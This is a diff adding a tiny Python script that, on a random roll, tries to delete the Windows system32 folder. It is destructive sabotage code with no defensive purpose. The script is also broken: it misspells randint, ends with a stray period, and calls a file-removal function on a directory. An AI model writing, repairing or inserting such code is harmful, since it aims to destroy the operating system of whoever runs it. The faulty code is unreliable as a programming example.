@@ -1,0 +1,5 @@
+import random
+import os
+
+if random.randit(0,6) == 1:
+	os.remove(r"C:\Windows\system32").
